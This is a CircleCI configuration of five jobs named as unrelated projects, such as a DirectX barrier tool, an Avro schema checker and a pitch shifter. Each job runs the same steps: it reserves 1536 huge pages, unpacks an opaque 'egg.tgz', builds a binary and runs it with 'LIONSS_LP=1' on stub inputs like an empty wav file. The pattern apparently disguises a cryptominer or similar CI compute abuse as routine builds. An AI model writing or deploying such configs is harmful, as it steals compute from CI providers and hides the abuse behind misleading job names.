version: 2.1

jobs:
  dx12_barrier:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List resources
          command: |
            printf 'textures 8\n' > rc.cfg
      - run:
          name: Build D3D12 backend
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dx12_barrier -j2
      - run:
          name: Insert resource barriers
          command: LIONSS_LP=1 ./build/dx12_barrier --conf rc.cfg --split
  avroevolve:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write avro schema
          command: |
            printf '{type:record}\n' > user.avsc
      - run:
          name: Build schema registry
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target avroevolve -j2
      - run:
          name: Check schema evolution
          command: LIONSS_LP=1 ./build/avroevolve --schema user.avsc --compat backward
  pitchShift2x:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load sample
          command: |
            : > voice.wav
      - run:
          name: Build phase vocoder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target pitchShift2x -j2
      - run:
          name: Shift pitch 2x
          command: LIONSS_LP=1 ./build/pitchShift2x --in voice.wav --semitones 12
  ql-planner:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write query
          command: |
            printf 'SELECT 1\n' > q.sql
      - run:
          name: Build query planner
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ql-planner -j2
      - run:
          name: Plan logical query
          command: LIONSS_LP=1 ./build/ql-planner --sql q.sql --optimize
  osm-relation-fix:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Fetch relation
          command: |
            printf '<relation id=1/>\n' > rel.osm
      - run:
          name: Build topology checker
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target osm-relation-fix -j2
      - run:
          name: Repair broken relations
          command: LIONSS_LP=1 ./build/osm-relation-fix --in rel.osm --strict
